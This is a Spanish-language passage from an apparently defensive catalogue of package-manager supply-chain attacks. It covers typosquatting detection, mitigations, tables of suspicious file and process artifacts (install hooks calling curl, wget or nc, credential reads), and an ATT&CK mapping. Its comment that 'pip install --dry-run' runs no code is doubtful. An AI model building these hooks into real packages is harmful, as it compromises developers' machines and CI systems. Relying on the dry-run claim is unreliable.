- Targets principales: entornos CI/CD y máquinas de desarrolladores

#### Detección
```bash
pip install --dry-run <paquete>   # preview sin ejecutar código
# Auditar nombres similares instalados
pip list | python3 -c "
import sys, difflib
pkgs = [l.split()[0] for l in sys.stdin if l.strip()]
for i,a in enumerate(pkgs):
    for b in pkgs[i+1:]:
        r = difflib.SequenceMatcher(None, a.lower(), b.lower()).ratio()
        if r > 0.85 and a != b:
            print(f'Similares: {a} / {b} ({r:.0%})')
"
```

#### Mitigación
- Allow-list de paquetes aprobados en entornos corporativos
- Copy-paste de nombres desde documentación oficial
- Proxy privado con lista curada de paquetes aprobados

---

## Resumen de Artefactos Detectables

### Artefactos de Ficheros

| Artefacto | Técnicas Relacionadas |
|-----------|----------------------|
| `/etc/apt/sources.list.d/*.list` nuevo | APT-02 |
| `/var/lib/dpkg/info/*.postinst` con curl/wget | APT-04 |
| `~/.cargo/registry/src/**` symlinks | CARGO-02 |
| `~/Library/LaunchAgents/*.plist` nuevo post-brew | BREW-01, BREW-03 |
| `/Library/LaunchDaemons/*.plist` nuevo | BREW-02 |
| `setup.py` con `cmdclass`, `subprocess`, `socket` | PIP-01, PIP-04 |
| `requirements.txt` con `--index-url` / `--trusted-host` | PIP-03 |
| `package.json` con `preinstall`/`postinstall` + comandos de red | NPM-02 |
| `.npmrc` con `registry=` apuntando a host no-npmjs.org | NPM-03 |
| `build.rs` con `std::net`, `Command::new`, acceso a env vars | CARGO-01 |
| `rubygems_plugin.rb` con `post_install`, `system` | GEM-02 |
| `extconf.rb` / Rakefile con `system()` | GEM-01, GEM-03 |

### Artefactos de Proceso

| Proceso padre | Proceso hijo sospechoso | Técnicas |
|--------------|------------------------|---------|
| `dpkg` / `apt-get` | `bash`, `curl`, `wget`, `nc`, `python` | APT-04 |
| `pip` / `python setup.py` | cualquier proceso de red | PIP-01, PIP-04 |
| `npm` / `node` | `bash`, `sh`, `curl`, `wget` | NPM-02 |
| `cargo` / `rustc` | cualquier proceso de red | CARGO-01, CARGO-04 |
| `ruby` (gem install) | `curl`, `wget`, `nc`, `bash` | GEM-01, GEM-02, GEM-03 |
| `ruby` (brew) | `curl`, `wget`, `osascript`, escrituras en LaunchAgents | BREW-01, BREW-02, BREW-03 |

### ATT&CK Mapping

| Táctica | Técnica | ID | Técnicas WTFpkg |
|---------|---------|-----|-----------------|
| Initial Access | Supply Chain Compromise: Dev Tools | T1195.001 | Todas |
| Execution | Unix Shell | T1059.004 | APT-04, GEM-01-03, NPM-02 |
| Execution | Python | T1059.006 | PIP-01, PIP-04 |
| Execution | JavaScript | T1059.007 | NPM-02, NPM-04 |
| Persistence | Launch Agent | T1543.001 | BREW-01, BREW-03 |
| Persistence | Launch Daemon | T1543.004 | BREW-02 |
| Persistence | Cron | T1053.003 | APT-02, PIP-04 |
| Persistence | Event Triggered Execution | T1546 | GEM-02 |
| Defense Evasion | Masquerading | T1036 | APT-03, GEM-04, NPM-01, PIP-02, PIP-05 |
| Defense Evasion | Impair Defenses | T1562.001 | APT-01 |
| Credential Access | Credentials In Files | T1552.001 | CARGO-01-03, NPM-03 |
| Collection | Automated Collection | T1119 | CARGO-01, CARGO-04, GEM-03, PIP-04 |
